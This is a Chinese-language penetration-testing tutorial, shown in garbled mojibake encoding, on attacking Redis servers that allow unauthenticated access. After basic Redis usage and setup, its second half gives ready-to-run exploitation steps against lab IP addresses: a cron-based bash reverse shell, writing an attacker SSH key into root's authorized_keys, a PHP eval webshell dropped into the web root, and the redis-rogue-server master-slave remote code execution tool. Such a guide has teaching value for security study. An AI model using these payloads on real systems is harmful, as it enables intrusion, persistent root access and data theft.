# æ¸—é€æµ‹è¯•ä¸­Redis å¸¸è§çš„æ”»å‡»æ–¹å¼

æœªæˆæƒè®¿é—®â‰ ä¸€å®šèƒ½æˆåŠŸåˆ©ç”¨

## Redisæ˜¯ä»€ä¹ˆï¼Ÿ

Redisæ˜¯æ•°æ®åº“çš„æ„æ€ã€‚Redisï¼ˆRemote Dictionary Server )ï¼Œå³è¿œç¨‹å­—å…¸æœåŠ¡ï¼Œæ˜¯ä¸€ä¸ªå¼€æºçš„ä½¿ç”¨ANSI Cè¯­è¨€ç¼–å†™ã€æ”¯æŒç½‘ç»œã€å¯åŸºäºå†…å­˜äº¦å¯æŒä¹…åŒ–çš„æ—¥å¿—å‹ã€Key-Valueæ•°æ®åº“ï¼Œå¹¶æä¾›å¤šç§è¯­è¨€çš„APIã€‚

Redisæ˜¯ä¸€ä¸ªkey-valueå­˜å‚¨ç³»ç»Ÿã€‚å’ŒMemcachedç±»ä¼¼ï¼Œå®ƒæ”¯æŒå­˜å‚¨çš„valueç±»å‹ç›¸å¯¹æ›´å¤šï¼ŒåŒ…æ‹¬string(å­—ç¬¦ä¸²)ã€list(é“¾è¡¨)ã€set(é›†åˆ)ã€zset(sorted set â€”æœ‰åºé›†åˆ)å’Œhashï¼ˆå“ˆå¸Œç±»å‹ï¼‰ã€‚è¿™äº›æ•°æ®ç±»å‹éƒ½æ”¯æŒpush/popã€add/removeåŠå–äº¤é›†å¹¶é›†å’Œå·®é›†åŠæ›´ä¸°å¯Œçš„æ“ä½œï¼Œè€Œä¸”è¿™äº›æ“ä½œéƒ½æ˜¯åŸå­æ€§çš„ã€‚åœ¨æ­¤åŸºç¡€ä¸Šï¼Œredisæ”¯æŒå„ç§ä¸åŒæ–¹å¼çš„æ’åºã€‚ä¸memcachedä¸€æ ·ï¼Œä¸ºäº†ä¿è¯æ•ˆç‡ï¼Œæ•°æ®éƒ½æ˜¯ç¼“å­˜åœ¨å†…å­˜ä¸­ã€‚åŒºåˆ«çš„æ˜¯redisä¼šå‘¨æœŸæ€§çš„æŠŠæ›´æ–°çš„æ•°æ®å†™å…¥ç£ç›˜æˆ–è€…æŠŠä¿®æ”¹æ“ä½œå†™å…¥è¿½åŠ çš„è®°å½•æ–‡ä»¶ï¼Œå¹¶ä¸”åœ¨æ­¤åŸºç¡€ä¸Šå®ç°äº†master-slave(ä¸»ä»)åŒæ­¥ã€‚

Redisè¿è¡Œåœ¨å†…å­˜ä¸­ä½†æ˜¯å¯ä»¥æŒä¹…åŒ–åˆ°ç£ç›˜ï¼Œæ‰€ä»¥åœ¨å¯¹ä¸åŒæ•°æ®é›†è¿›è¡Œé«˜é€Ÿè¯»å†™æ—¶éœ€è¦æƒè¡¡å†…å­˜ï¼Œå› ä¸ºæ•°æ®é‡ä¸èƒ½å¤§äºç¡¬ä»¶å†…å­˜ã€‚åœ¨å†…å­˜æ•°æ®åº“æ–¹é¢çš„å¦ä¸€ä¸ªä¼˜ç‚¹æ˜¯ï¼Œç›¸æ¯”åœ¨ç£ç›˜ä¸Šç›¸åŒçš„å¤æ‚çš„æ•°æ®ç»“æ„ï¼Œåœ¨å†…å­˜ä¸­æ“ä½œèµ·æ¥éå¸¸ç®€å•ï¼Œè¿™æ ·Rediså¯ä»¥åšå¾ˆå¤šå†…éƒ¨å¤æ‚æ€§å¾ˆå¼ºçš„äº‹æƒ…ã€‚åŒæ—¶ï¼Œåœ¨ç£ç›˜æ ¼å¼æ–¹é¢ä»–ä»¬æ˜¯ç´§å‡‘çš„ä»¥è¿½åŠ çš„æ–¹å¼äº§ç”Ÿçš„ï¼Œå› ä¸ºä»–ä»¬å¹¶ä¸éœ€è¦è¿›è¡Œéšæœºè®¿é—®ã€‚

Redisçš„å‡ºç°ï¼Œå¾ˆå¤§ç¨‹åº¦è¡¥å¿äº†memcachedè¿™ç±»key/valueå­˜å‚¨çš„ä¸è¶³ï¼Œåœ¨éƒ¨åˆ†åœºåˆå¯ä»¥å¯¹å…³ç³»æ•°æ®åº“èµ·åˆ°å¾ˆå¥½çš„è¡¥å……ä½œç”¨ã€‚

## Redis åŸºæœ¬è¯­æ³•

### Redis é…ç½®

Redis çš„é…ç½®æ–‡ä»¶ä½äº Redis å®‰è£…ç›®å½•ä¸‹ï¼Œæ–‡ä»¶åä¸º **redis.conf**(Windows åä¸ºredis.windows.conf)ã€‚ä½ å¯ä»¥é€šè¿‡ **CONFIG**å‘½ä»¤**æŸ¥çœ‹**æˆ–**è®¾ç½®**é…ç½®é¡¹ã€‚

**Redis CONFIG æŸ¥çœ‹é…ç½®å‘½ä»¤æ ¼å¼å¦‚ä¸‹ï¼š**

```
redis 127.0.0.1:6379> CONFIG GET CONFIG_SETTING_NAME
```

ä½¿ç”¨ *****å·è·å–æ‰€æœ‰é…ç½®é¡¹ï¼š

```
redis 127.0.0.1:6379> CONFIG GET *

  1) "dbfilename"
  2) "dump.rdb"
  3) "requirepass"
  4) ""
  5) "masterauth"
  6) ""
  7) "unixsocket"
  8) ""
  9) "logfile"
  ......
```

### Redis å‘½ä»¤

Redis å‘½ä»¤ç”¨äºåœ¨ redis æœåŠ¡ä¸Šæ‰§è¡Œæ“ä½œã€‚è¦åœ¨ redis æœåŠ¡ä¸Šæ‰§è¡Œå‘½ä»¤éœ€è¦ä¸€ä¸ª redis å®¢æˆ·ç«¯ã€‚Redis å®¢æˆ·ç«¯åœ¨æˆ‘ä»¬ä¹‹å‰ä¸‹è½½çš„çš„ redis çš„å®‰è£…åŒ…ä¸­ã€‚

**Redis å®¢æˆ·ç«¯çš„åŸºæœ¬è¯­æ³•ä¸ºï¼š**

```bash
$ redis-cli
```

ä»¥ä¸‹å®ä¾‹è®²è§£äº†å¦‚ä½•å¯åŠ¨ redis å®¢æˆ·ç«¯ï¼š

å¯åŠ¨ redis å®¢æˆ·ç«¯ï¼Œæ‰“å¼€ç»ˆç«¯å¹¶è¾“å…¥å‘½ä»¤ **redis-cli**ã€‚è¯¥å‘½ä»¤ä¼šè¿æ¥æœ¬åœ°çš„ redis æœåŠ¡ã€‚

```bash
$ redis-cli
redis 127.0.0.1:6379>
redis 127.0.0.1:6379> PING

PONG
```

åœ¨ä»¥ä¸Šå®ä¾‹ä¸­æˆ‘ä»¬è¿æ¥åˆ°æœ¬åœ°çš„ redis æœåŠ¡å¹¶æ‰§è¡Œ **PING** å‘½ä»¤ï¼Œè¯¥å‘½ä»¤ç”¨äºæ£€æµ‹ redis æœåŠ¡æ˜¯å¦å¯åŠ¨ï¼Œå¦‚æœæœåŠ¡å™¨è¿ä½œæ­£å¸¸çš„è¯ï¼Œä¼šè¿”å›ä¸€ä¸ª PONG ã€‚

**åœ¨è¿œç¨‹æœåŠ¡ä¸Šæ‰§è¡Œå‘½ä»¤**

å¦‚æœéœ€è¦åœ¨è¿œç¨‹ redis æœåŠ¡ä¸Šæ‰§è¡Œå‘½ä»¤ï¼ŒåŒæ ·æˆ‘ä»¬ä½¿ç”¨çš„ä¹Ÿæ˜¯ **redis-cli** å‘½ä»¤ã€‚

**è¯­æ³•**

```bash
$ redis-cli -h host -p port -a password
```

ä»¥ä¸‹å®ä¾‹æ¼”ç¤ºäº†å¦‚ä½•è¿æ¥åˆ°ä¸»æœºä¸º 127.0.0.1ï¼Œç«¯å£ä¸º 6379 ï¼Œå¯†ç ä¸º mypass çš„ redis æœåŠ¡ä¸Šã€‚

```bash
$redis-cli -h 127.0.0.1 -p 6379 -a "mypass"
redis 127.0.0.1:6379>
redis 127.0.0.1:6379> PING

PONG
```

### SET å‘½ä»¤

Redis SET å‘½ä»¤ç”¨äºè®¾ç½®ç»™å®š key çš„å€¼ã€‚å¦‚æœ key å·²ç»å­˜å‚¨å…¶ä»–å€¼ï¼Œ SET å°±è¦†å†™æ—§å€¼ï¼Œä¸”æ— è§†ç±»å‹ã€‚

redis SET å‘½ä»¤åŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š

```bash
redis 127.0.0.1:6379> SET KEY_NAME VALUE
```

### Get å‘½ä»¤

Redis Get å‘½ä»¤ç”¨äºè·å–æŒ‡å®š key çš„å€¼ã€‚å¦‚æœ key ä¸å­˜åœ¨ï¼Œè¿”å› nil ã€‚

redis Get å‘½ä»¤åŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š

```bash
redis 127.0.0.1:6379> GET KEY_NAME
```

### Flushall å‘½ä»¤

Redis Flushall å‘½ä»¤ç”¨äºæ¸…ç©ºæ•´ä¸ª Redis æœåŠ¡å™¨çš„æ•°æ®(åˆ é™¤æ‰€æœ‰æ•°æ®åº“çš„æ‰€æœ‰ key )ã€‚

redis Flushall å‘½ä»¤åŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š

```bash
redis 127.0.0.1:6379> FLUSHALL
```

### Redis æ•°æ®å¤‡ä»½ä¸æ¢å¤

Redis **SAVE** å‘½ä»¤ç”¨äºåˆ›å»ºå½“å‰æ•°æ®åº“çš„å¤‡ä»½ã€‚Save å‘½ä»¤æ‰§è¡Œä¸€ä¸ªåŒæ­¥ä¿å­˜æ“ä½œï¼Œå°†å½“å‰ Redis å®ä¾‹çš„æ‰€æœ‰æ•°æ®å¿«ç…§(snapshot)ä»¥é»˜è®¤ RDB æ–‡ä»¶çš„å½¢å¼ä¿å­˜åˆ°ç¡¬ç›˜ã€‚

redis Save å‘½ä»¤åŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š

```bash
redis 127.0.0.1:6379> SAVE 
OK
```

è¯¥å‘½ä»¤å°†åœ¨ redis å®‰è£…ç›®å½•ä¸­åˆ›å»ºdump.rdbæ–‡ä»¶ã€‚

**æ¢å¤æ•°æ®**

å¦‚æœéœ€è¦æ¢å¤æ•°æ®ï¼Œåªéœ€å°†å¤‡ä»½æ–‡ä»¶ (dump.rdb) ç§»åŠ¨åˆ° redis å®‰è£…ç›®å½•å¹¶å¯åŠ¨æœåŠ¡å³å¯ã€‚è·å– redis ç›®å½•å¯ä»¥ä½¿ç”¨ **CONFIG** å‘½ä»¤ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š

```bash
redis 127.0.0.1:6379> CONFIG GET dir
1) "dir"
2) "/usr/local/redis/bin"
```

ä»¥ä¸Šå‘½ä»¤ **CONFIG GET dir** è¾“å‡ºçš„ redis å®‰è£…ç›®å½•ä¸º /usr/local/redis/binã€‚

### Redis å®‰å…¨

æˆ‘ä»¬å¯ä»¥é€šè¿‡ redis çš„é…ç½®æ–‡ä»¶è®¾ç½®å¯†ç å‚æ•°ï¼Œ**è¿™æ ·å®¢æˆ·ç«¯è¿æ¥åˆ° redis æœåŠ¡å°±éœ€è¦å¯†ç éªŒè¯**ï¼Œè¿™æ ·å¯ä»¥è®©ä½ çš„ redis æœåŠ¡æ›´å®‰å…¨ã€‚

æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹æ˜¯å¦è®¾ç½®äº†å¯†ç éªŒè¯ï¼š

```bash
127.0.0.1:6379> CONFIG get requirepass
1) "requirepass"
2) ""
```

**é»˜è®¤æƒ…å†µä¸‹ requirepass å‚æ•°æ˜¯ç©ºçš„ï¼Œä¹Ÿå°±æ˜¯è¯´é»˜è®¤æƒ…å†µä¸‹æ˜¯æ— å¯†ç éªŒè¯çš„ï¼Œè¿™å°±æ„å‘³ç€ä½ æ— éœ€é€šè¿‡å¯†ç éªŒè¯å°±å¯ä»¥è¿æ¥åˆ° redis æœåŠ¡ã€‚**

ä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥ä¿®æ”¹è¯¥å‚æ•°ï¼š

```bash
127.0.0.1:6379> CONFIG set requirepass "657260"
OK
127.0.0.1:6379> CONFIG get requirepass
1) "requirepass"
2) "657260"
```

è®¾ç½®å¯†ç åï¼Œå®¢æˆ·ç«¯è¿æ¥ redis æœåŠ¡å°±éœ€è¦å¯†ç éªŒè¯ï¼Œå¦åˆ™æ— æ³•æ‰§è¡Œå‘½ä»¤ã€‚

**è¯­æ³•**

**AUTH** å‘½ä»¤åŸºæœ¬è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š

```bash
127.0.0.1:6379> AUTH password
```

è¯¥å‘½ä»¤ç”¨äºæ£€æµ‹ç»™å®šçš„å¯†ç å’Œé…ç½®æ–‡ä»¶ä¸­çš„å¯†ç æ˜¯å¦ç›¸ç¬¦ã€‚

redis Auth å‘½ä»¤åŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š

```bash
redis 127.0.0.1:6379> AUTH PASSWORD
```

å¯†ç åŒ¹é…æ—¶è¿”å› OK ï¼Œå¦åˆ™è¿”å›ä¸€ä¸ªé”™è¯¯ã€‚

å®ä¾‹

```bash
127.0.0.1:6379> AUTH "657260"
OK
127.0.0.1:6379> SET mykey "Test value"
OK
127.0.0.1:6379> GET mykey
"Test value"
```

## Redis ç¯å¢ƒæ­å»º

**ç¬¬ä¸€æ­¥ï¼š**ubuntuä¸­ä¸‹è½½å®‰è£…Rediså¹¶è§£å‹ï¼š

```bash
wget http://download.redis.io/releases/redis-5.0.12.tar.gz
tar -zxvf redis-5.0.12.tar.gz
```

**ç¬¬äºŒæ­¥ï¼š**ä¸‹è½½å¹¶è§£å‹å¥½ä»¥åï¼Œè¿›å…¥åˆ°Redisç›®å½•ä¸­ï¼Œæ‰§è¡Œ`make`ï¼Œé€šè¿‡makeç¼–è¯‘çš„æ–¹å¼æ¥å®‰è£…ï¼š

```go
make
```

å¦‚ä¸Šå›¾æç¤º â€œItâ€™s a good idea to run â€˜make testâ€™ â€œ åˆ™ä»£è¡¨ç¼–è¯‘å®‰è£…æˆåŠŸã€‚

**ç¬¬å››æ­¥ï¼š**makeç»“æŸåï¼Œè¿›å…¥srcç›®å½•ï¼Œå°†redis-serverå’Œredis-cliæ‹·è´åˆ°/usr/binç›®å½•ä¸‹ï¼ˆè¿™æ ·å¯åŠ¨redis-serverå’Œredis-cliå°±ä¸ç”¨æ¯æ¬¡éƒ½è¿›å…¥å®‰è£…ç›®å½•äº†ï¼‰

```bash
cd src
cp redis-cli /usr/bin
cp redis-server /usr/bin
```

**ç¬¬äº”æ­¥ï¼š**è¿”å›redis-2.8.17ç›®å½•ï¼Œå°†redis.confæ‹·è´åˆ°/etcç›®å½•ä¸‹ã€‚

```bash
cd ../
cp redis.conf /etc
```



**ç¬¬å…­æ­¥ï¼š**ä½¿ç”¨/etcç›®å½•ä¸‹çš„reids.confæ–‡ä»¶ä¸­çš„é…ç½®å¯åŠ¨redisæœåŠ¡ï¼š

```bash
redis-server /etc/redis.conf
```

## Redis æœªæˆæƒè®¿é—®æ¼æ´

Redis é»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œé‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æº ip è®¿é—®ç­‰ï¼Œè¿™æ ·å°†ä¼šå°† Redis æœåŠ¡æš´éœ²åˆ°å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆä¸€èˆ¬ä¸ºç©ºï¼‰ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—® Redis ä»¥åŠè¯»å– Redis çš„æ•°æ®ã€‚æ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—® Redis çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥åˆ©ç”¨ Redis è‡ªèº«çš„æä¾›çš„ config å‘½ä»¤åƒç›®æ ‡ä¸»æœºå†™WebShellã€å†™SSHå…¬é’¥ã€åˆ›å»ºè®¡åˆ’ä»»åŠ¡åå¼¹Shellç­‰ã€‚å…¶æ€è·¯éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå°±æ˜¯å…ˆå°†Redisçš„æœ¬åœ°æ•°æ®åº“å­˜æ”¾ç›®å½•è®¾ç½®ä¸ºwebç›®å½•ã€~/.sshç›®å½•æˆ–/var/spool/cronç›®å½•ç­‰ï¼Œç„¶åå°†dbfilenameï¼ˆæœ¬åœ°æ•°æ®åº“æ–‡ä»¶åï¼‰è®¾ç½®ä¸ºæ–‡ä»¶åä½ æƒ³è¦å†™å…¥çš„æ–‡ä»¶åç§°ï¼Œæœ€åå†æ‰§è¡Œsaveæˆ–bgsaveä¿å­˜ï¼Œåˆ™æˆ‘ä»¬å°±æŒ‡å®šçš„ç›®å½•é‡Œå†™å…¥æŒ‡å®šçš„æ–‡ä»¶äº†ã€‚

![pt-1.1](C:\Users\wlen\Desktop\img3\pt-1.1.png)

**ç®€å•è¯´ï¼Œæ¼æ´çš„äº§ç”Ÿæ¡ä»¶æœ‰ä»¥ä¸‹ä¸¤ç‚¹ï¼š**

> redis ç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œä¸”æ²¡æœ‰è¿›è¡Œæ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æºipè®¿é—®ç­‰ç›¸å…³å®‰å…¨ç­–ç•¥ï¼Œç›´æ¥æš´éœ²åœ¨å…¬ç½‘ã€‚
>
> æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆä¸€èˆ¬ä¸ºç©ºï¼‰ï¼Œå¯ä»¥å…å¯†ç è¿œç¨‹ç™»å½•redisæœåŠ¡ã€‚

**æ¼æ´å±å®³ï¼š**

> æ”»å‡»è€…æ— éœ€è®¤è¯å°±å¯ä»¥è®¿é—®åˆ°å†…éƒ¨æ•°æ®ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œé»‘å®¢ä¹Ÿå¯ä»¥æ¶æ„æ‰§è¡Œflushallæ¥æ¸…ç©ºæ‰€æœ‰æ•°æ®ï¼›
>
> æ”»å‡»è€…å¯é€šè¿‡EVALæ‰§è¡Œluaä»£ç ï¼Œæˆ–é€šè¿‡æ•°æ®å¤‡ä»½åŠŸèƒ½å¾€ç£ç›˜å†™å…¥åé—¨æ–‡ä»¶ï¼›
>
> æœ€ä¸¥é‡çš„æƒ…å†µï¼Œå¦‚æœRedisä»¥rootèº«ä»½è¿è¡Œï¼Œé»‘å®¢å¯ä»¥ç»™rootè´¦æˆ·å†™å…¥SSHå…¬é’¥æ–‡ä»¶ï¼Œç›´æ¥é€šè¿‡SSHç™»å½•å—å®³æœåŠ¡å™¨ã€‚

## åŸºäºæœªæˆæƒè®¿é—®æ¼æ´çš„åˆ©ç”¨

## 0x02 é€šè¿‡è®¡åˆ’ä»»åŠ¡åå¼¹shell

åˆ©ç”¨æ¡ä»¶ï¼š

- redisä»¥rootèº«ä»½è¿è¡Œ
- æœªæˆæƒè®¿é—®æˆ–æˆæƒå£ä»¤å·²çŸ¥

åœ¨kaliä¸­é€šè¿‡`redis-cli -h 192.168.100.101 -p 6379`è¿æ¥åˆ°redisï¼Œè¾“å…¥ä»¥ä¸‹æŒ‡ä»¤åˆ©ç”¨crontabåå¼¹shell



```shell
# cronè¡¨è¾¾å¼æ ¼å¼ï¼š{ç§’æ•°} {åˆ†é’Ÿ} {å°æ—¶} {æ—¥æœŸ} {æœˆä»½} {æ˜ŸæœŸ} {å¹´ä»½(å¯ä¸ºç©º)} å‘½ä»¤
# æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡echo "haha"ï¼š* * * * * echo "haha"
192.168.100.101:6379> set x "\n* * * * * bash -i >& /dev/tcp/192.168.100.99/4444 0>&1\n"

# è®¾ç½®ç›®å½•ä¸º/var/spool/cron/
192.168.100.101:6379> config set dir /var/spool/cron/

# è®¾ç½®æ–‡ä»¶åä¸ºroot
192.168.100.101:6379> config set dbfilename root

# ä¿å­˜å¿«ç…§åˆ°æœ¬åœ°
192.168.100.101:6379> save
```

kaliä¸­æ‰“å¼€ä¸€ä¸ªæ–°çš„å‘½ä»¤è¡Œçª—å£æ‰§è¡Œ`nc -lvnp 4444`è¿›è¡Œç›‘å¬ï¼Œè¿‡ä¸€ä¼šå„¿å°±èƒ½æ¥æ”¶åˆ°åå¼¹å›æ¥çš„shellï¼š

[![img](https://img2022.cnblogs.com/blog/2708418/202201/2708418-20220124105249042-1990828012.png)](https://img2022.cnblogs.com/blog/2708418/202201/2708418-20220124105249042-1990828012.png)

ç”±äºredisçš„å‹ç¼©å‚¨å­˜æœºåˆ¶ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ä¼šå› ä¸ºåå¼¹shellçš„æŒ‡ä»¤è¢«å‹ç¼©ï¼Œä»è€Œå¯¼è‡´åå¼¹shellå¤±è´¥ï¼š



```shell
192.168.100.101:6379> set x "\n* * * * * bash -i >& /dev/tcp/192.168.100.100/4444 0>&1\n"
192.168.100.101:6379> save

[root@localhost  ~]# cat /var/spool/cron/root 
* ï¿½bash -i &> /dev/tcp/192.168.100@/4  0>&1

192.168.100.101:6379> set x "\n* * * * * bash -i >& /dev/tcp/192.168.100.99/4444 0>&1\n"
192.168.100.101:6379> save

[root@localhost  ~]# cat /var/spool/cron/root 
* * * * * bash -i &> /dev/tcp/192.168.100.99/4444 0>&1
```

å½“è¿è¡Œredisçš„ç”¨æˆ·ä¸ºæ™®é€šç”¨æˆ·æ—¶ï¼Œä¼šæ— æ³•å‡ºç°åˆ‡æ¢ç›®å½•å¤±è´¥çš„æƒ…å†µï¼š



```shell
config set dir /var/spool/cron
(error) ERR Changing directory: Permission denied
```

## 0x03 é€šè¿‡SSHå…¬é’¥è¿œç¨‹è¿æ¥

åˆ©ç”¨æ¡ä»¶ï¼š

- redisä»¥rootèº«ä»½è¿è¡Œ
- æœªæˆæƒè®¿é—®æˆ–æˆæƒå£ä»¤å·²çŸ¥
- æœåŠ¡å™¨å¼€æ”¾SSHæœåŠ¡ä¸”å…è®¸å¯†é’¥ç™»å½•

åœ¨kaliä¸­ä½¿ç”¨`ssh-keygen -t rsa`ç”Ÿæˆå¯†é’¥ï¼š

[![img](https://img2022.cnblogs.com/blog/2708418/202201/2708418-20220124105312101-848184558.png)](https://img2022.cnblogs.com/blog/2708418/202201/2708418-20220124105312101-848184558.png)

å°†ç”Ÿæˆçš„å…¬é’¥æ–‡ä»¶ä¿å­˜åˆ°æœ¬åœ°ï¼š



```shell
â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali]
â””â”€# (echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > kali
```

å°†æ–‡ä»¶å†™å…¥redisè¿›è¡Œåˆ©ç”¨ï¼š



```shell
# å°†ä¸Šä¸€æ­¥ç”Ÿæˆçš„kaliæ–‡ä»¶å†™å…¥rediså¹¶è®¾ç½®é”®çš„å€¼ä¸ºkali
â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali]
â””â”€# cat kali | redis-cli -h 192.168.100.101 -p 6379 -x set kali

# è¿æ¥redisï¼Œå¹¶å°†å…¬é’¥æ–‡ä»¶å†™å…¥/root/.ssh/authorized_keysä¸­
â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali]
â””â”€# redis-cli -h 192.168.100.101 -p 6379
192.168.100.101:6379> config set dir /root/.ssh/
192.168.100.101:6379> config set dbfilename authorized_keys
192.168.100.101:6379> save

# ä½¿ç”¨å¯†é’¥è¿›è¡Œç™»å½•
â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali]
â””â”€# ssh -i /root/.ssh/id_rsa root@192.168.100.101
```

[![img](https://img2022.cnblogs.com/blog/2708418/202201/2708418-20220124105335567-992541671.png)](https://img2022.cnblogs.com/blog/2708418/202201/2708418-20220124105335567-992541671.png)

## 0x04 é€šè¿‡æ–‡ä»¶å†™å…¥è·å–webshell

åˆ©ç”¨æ¡ä»¶ï¼š

- æœªæˆæƒè®¿é—®æˆ–æˆæƒå£ä»¤å·²çŸ¥
- æœåŠ¡å™¨å¼€ç€WEBæœåŠ¡ä¸”WEBç›®å½•è·¯å¾„å·²çŸ¥

å€˜è‹¥æœåŠ¡å™¨è¿è¡Œç€LAMP/LNMPæœåŠ¡ï¼Œä¸”å·²çŸ¥å·¥ä½œç›®å½•ä¸º`/var/www/html/`ï¼Œå¯é€šè¿‡ä»¥ä¸‹æŒ‡ä»¤å†™å…¥webshellï¼Œæˆ–å‚è€ƒå†™å…¥SSHå…¬é’¥çš„è¿‡ç¨‹å†™å…¥æœ¨é©¬æ–‡ä»¶ï¼š



```shell
config set dir /var/www/html/
config set dbfilename shell.php
set x "<?php @eval($_POST['test']);?>"
save
```

## 0x05 é€šè¿‡ä¸»ä»å¤åˆ¶è·å–shell

åˆ©ç”¨æ¡ä»¶ï¼š

- æœªæˆæƒè®¿é—®æˆ–æˆæƒå£ä»¤å·²çŸ¥
- Redis <=5.0.5

å‚è€ƒåœ°å€ï¼šhttps://github.com/n0b0dyCN/redis-rogue-server

ä½¿ç”¨æ–¹æ³•ï¼š



```shell
python3 redis-rogue-server.py --rhost <target address> --rport <target port> --lhost <vps address> --lport <vps port>
```

å‚æ•°è¯´æ˜ï¼š

- --rpasswd å¦‚æœç›®æ ‡RedisæœåŠ¡å¼€å¯äº†è®¤è¯åŠŸèƒ½ï¼Œå¯ä»¥é€šè¿‡è¯¥é€‰é¡¹æŒ‡å®šå¯†ç 
- --rhost ç›®æ ‡redisæœåŠ¡IP
- --rport ç›®æ ‡redisæœåŠ¡ç«¯å£ï¼Œé»˜è®¤ä¸º6379
- --lhost vpsçš„IPåœ°å€
- --lport vpsçš„ç«¯å£ï¼Œé»˜è®¤ä¸º21000



```shell
â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali]
â””â”€# git clone https://github.com/n0b0dyCN/redis-rogue-server.git

â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali]
â””â”€# cd redis-rogue-server

â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali]
â””â”€# python3 redis-rogue-server.py --rhost 192.168.100.101 --lhost 192.168.100.99
```

[![img](https://img2022.cnblogs.com/blog/2708418/202201/2708418-20220124105353632-844791741.png)](https://img2022.cnblogs.com/blog/2708418/202201/2708418-20220124105353632-844791741.png)
